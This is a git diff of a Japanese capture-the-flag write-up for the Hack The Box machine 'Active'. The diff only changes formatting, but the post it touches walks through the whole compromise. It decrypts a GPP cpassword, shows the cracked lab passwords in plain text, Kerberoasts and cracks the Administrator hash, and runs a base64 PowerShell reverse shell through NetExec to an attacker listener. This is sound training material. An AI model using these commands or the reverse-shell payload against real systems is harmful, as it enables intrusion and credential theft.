@@ -2,7 +2,7 @@
 layout: post
 title: HTB Active
 subtitle: Active Directory Enumeration and Exploitation
-tags: [windows, easy]
+tags: [htb, windows, easy]
 ---
 
 ## 列挙
@@ -15,7 +15,7 @@ rustscan で TCP のフルポートスキャンを行う。
 rustscan -a 10.129.36.197 --ulimit 5000 --timeout 4000 -- -sV -Pn -oN all-tcp.rscan -oG all-tcp.grscan
 ```
 
-![image-20240521204953485](https://l3ickey.github.io/assets/img/typora-images/image-20240521204953485.png)
+![image-20240521204953485](https://l3ickey.github.io/assets/img/typora-images/image-20240521204953485.png){: .mx-auto.d-block :}
 
 情報列挙の狙い目は ldap, smb あたり？ldap からドメイン名が active.htb であることが分かる。
 
@@ -25,7 +25,7 @@ nmap で UDP の Well-known ポートスキャンを行う。
 sudo nmap -Pn -sU -T4 10.129.36.197 -oN wellknown-udp.nmap -oG wellknown-udp.gnmap
 ```
 
-![image-20240521204834415](https://l3ickey.github.io/assets/img/typora-images/image-20240521204834415.png)
+![image-20240521204834415](https://l3ickey.github.io/assets/img/typora-images/image-20240521204834415.png){: .mx-auto.d-block :}
 
 特に面白そうなポートは開いていない。
 
@@ -37,7 +37,7 @@ enum4linux-ng で SMB の列挙を行う。
 enum4linux-ng.py -A 10.129.36.197
 ```
 
-![image-20240521210417356](https://l3ickey.github.io/assets/img/typora-images/image-20240521210417356.png)
+![image-20240521210417356](https://l3ickey.github.io/assets/img/typora-images/image-20240521210417356.png){: .mx-auto.d-block :}
 
 Replication という名前の共有ディスクが Listing: OK になっているのでアクセスできそう。
 
@@ -52,7 +52,7 @@ smb: \> prompt OFF
 smb: \> mget *
 ```
 
-![image-20240521211447856](https://l3ickey.github.io/assets/img/typora-images/image-20240521211447856.png)
+![image-20240521211447856](https://l3ickey.github.io/assets/img/typora-images/image-20240521211447856.png){: .mx-auto.d-block :}
 
 ダウンロードしたファイルを確認すると、DfsrPrivate, Policies, scripts というフォルダがあり、どうやら SYSVOL の複製っぽい。検証やバックアップ目的で作成した Replication 共有ディスクの権限設定をミスったのだろうか？
 
@@ -62,7 +62,7 @@ smb: \> mget *
 cat Replication/active.htb/Policies/\{31B2F340-016D-11D2-945F-00C04FB984F9\}/MACHINE/Preferences/Groups/Groups.xml
 ```
 
-![image-20240522171843319](https://l3ickey.github.io/assets/img/typora-images/image-20240522171843319.png)
+![image-20240522171843319](https://l3ickey.github.io/assets/img/typora-images/image-20240522171843319.png){: .mx-auto.d-block :}
 
 ## 足がかり
 
@@ -70,7 +70,7 @@ cat Replication/active.htb/Policies/\{31B2F340-016D-11D2-945F-00C04FB984F9\}/MAC
 
 cpassword の復号化について調べると、gpp-decrypt というツールで復号できることがわかった。
 
-https://www.kali.org/tools/gpp-decrypt/
+[https://www.kali.org/tools/gpp-decrypt/](https://www.kali.org/tools/gpp-decrypt/)
 
 > A simple ruby script that will decrypt a given GPP encrypted string.
 
@@ -80,10 +80,9 @@ gpp-decrypt を使って cpassword を復号化する。
 gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
 ```
 
-![image-20240522173421492](https://l3ickey.github.io/assets/img/typora-images/image-20240522173421492.png)
+![image-20240522173421492](https://l3ickey.github.io/assets/img/typora-images/image-20240522173421492.png){: .mx-auto.d-block :}
 
-ユーザー名: active.htb\SVC_TGS
-パスワード: GPPstillStandingStrong2k18
+ユーザー名: active.htb\SVC_TGS, パスワード: GPPstillStandingStrong2k18
 
 ### 認証情報を使った SMB の列挙
 
@@ -93,7 +92,7 @@ SVC_TGS ユーザーの認証情報を使って再び SMB を列挙する。
 enum4linux-ng.py -A 10.129.36.197 -u SVC_TGS -p GPPstillStandingStrong2k18
 ```
 
-![image-20240522174529041](https://l3ickey.github.io/assets/img/typora-images/image-20240522174529041.png)
+![image-20240522174529041](https://l3ickey.github.io/assets/img/typora-images/image-20240522174529041.png){: .mx-auto.d-block :}
 
 NETLOGON, Replication, SYSVOL, Users の共有ディスクが Listing: OK になっているのでファイルを漁ってみる。
 
@@ -101,7 +100,7 @@ NETLOGON, Replication, SYSVOL, Users の共有ディスクが Listing: OK にな
 
 Users 共有ディスクを確認すると、C:\Users であることがわかるので smbclient で Users をローカルにダウンロードし user.txt を取得する。
 
-![image-20240522175832167](https://l3ickey.github.io/assets/img/typora-images/image-20240522175832167.png)
+![image-20240522175832167](https://l3ickey.github.io/assets/img/typora-images/image-20240522175832167.png){: .mx-auto.d-block :}
 
 ## 権限昇格
 
@@ -117,7 +116,7 @@ user.txt を取得することはできたが、shell が取れないため躓�
 impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.129.36.197
 ```
 
-![image-20240522185039995](https://l3ickey.github.io/assets/img/typora-images/image-20240522185039995.png)
+![image-20240522185039995](https://l3ickey.github.io/assets/img/typora-images/image-20240522185039995.png){: .mx-auto.d-block :}
 
 Administrator ユーザーで active/CIFS:445 サービスが稼働している。
 
@@ -129,11 +128,11 @@ impacket-GetUserSPNs を使って、Administrator のパスワードハッシュ
 impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.129.36.197 -request -outputfile GetUserSPNs.txt
 ```
 
-![image-20240522195127169](https://l3ickey.github.io/assets/img/typora-images/image-20240522195127169.png)
+![image-20240522195127169](https://l3ickey.github.io/assets/img/typora-images/image-20240522195127169.png){: .mx-auto.d-block :}
 
 ハッシュは $krb5tgs から始まるパスワードハッシュであることがわかる。
 
-![image-20240522195416567](https://l3ickey.github.io/assets/img/typora-images/image-20240522195416567.png)
+![image-20240522195416567](https://l3ickey.github.io/assets/img/typora-images/image-20240522195416567.png){: .mx-auto.d-block :}
 
 john the ripper を使って、パスワードハッシュに対して rockyou.txt のブルートフォース攻撃をする。
 
@@ -141,10 +140,9 @@ john the ripper を使って、パスワードハッシュに対して rockyou.t
 john --wordlist=/usr/share/wordlists/rockyou.txt GetUserSPNs.txt
 ```
 
-![image-20240522195631327](https://l3ickey.github.io/assets/img/typora-images/image-20240522195631327.png)
+![image-20240522195631327](https://l3ickey.github.io/assets/img/typora-images/image-20240522195631327.png){: .mx-auto.d-block :}
 
-ユーザー名: Administrator
-パスワード: Ticketmaster1968
+ユーザー名: Administrator, パスワード: Ticketmaster1968
 
 ### root.txt
 
@@ -154,15 +152,15 @@ john --wordlist=/usr/share/wordlists/rockyou.txt GetUserSPNs.txt
 nxc wmi 10.129.36.197 -u Administrator -p Ticketmaster1968 -x 'type C:\Users\Administrator\Desktop\root.txt'
 ```
 
-![image-20240522200120622](https://l3ickey.github.io/assets/img/typora-images/image-20240522200120622.png)
+![image-20240522200120622](https://l3ickey.github.io/assets/img/typora-images/image-20240522200120622.png){: .mx-auto.d-block :}
 
 ## おまけ
 
 最後まで shell を取らなかったが、もちろん shell を取ることができる。
 
-https://www.revshells.com/ で PowerShell #3 (Base64) のペイロードを作成する。
+[https://www.revshells.com/](https://www.revshells.com/) で PowerShell #3 (Base64) のペイロードを作成する。
 
-![image-20240522200929062](https://l3ickey.github.io/assets/img/typora-images/image-20240522200929062.png)
+![image-20240522200929062](https://l3ickey.github.io/assets/img/typora-images/image-20240522200929062.png){: .mx-auto.d-block :}
 
 nc でリバースシェルを待ち受ける。
 
@@ -170,7 +168,7 @@ nc でリバースシェルを待ち受ける。
 nc -nlvp 443
 ```
 
-![image-20240522201042903](https://l3ickey.github.io/assets/img/typora-images/image-20240522201042903.png)
+![image-20240522201042903](https://l3ickey.github.io/assets/img/typora-images/image-20240522201042903.png){: .mx-auto.d-block :}
 
 NetExec を使ってペイロードを実行する。
 
@@ -178,8 +176,8 @@ NetExec を使ってペイロードを実行する。
 nxc wmi 10.129.36.197 -u Administrator -p Ticketmaster1968 -x 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQAzACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA='
 ```
 
-![image-20240522201213716](https://l3ickey.github.io/assets/img/typora-images/image-20240522201213716.png)
+![image-20240522201213716](https://l3ickey.github.io/assets/img/typora-images/image-20240522201213716.png){: .mx-auto.d-block :}
 
 リバースシェルを受け取ることができる。
 
-![image-20240522201524291](https://l3ickey.github.io/assets/img/typora-images/image-20240522201524291.png)
+![image-20240522201524291](https://l3ickey.github.io/assets/img/typora-images/image-20240522201524291.png){: .mx-auto.d-block :}
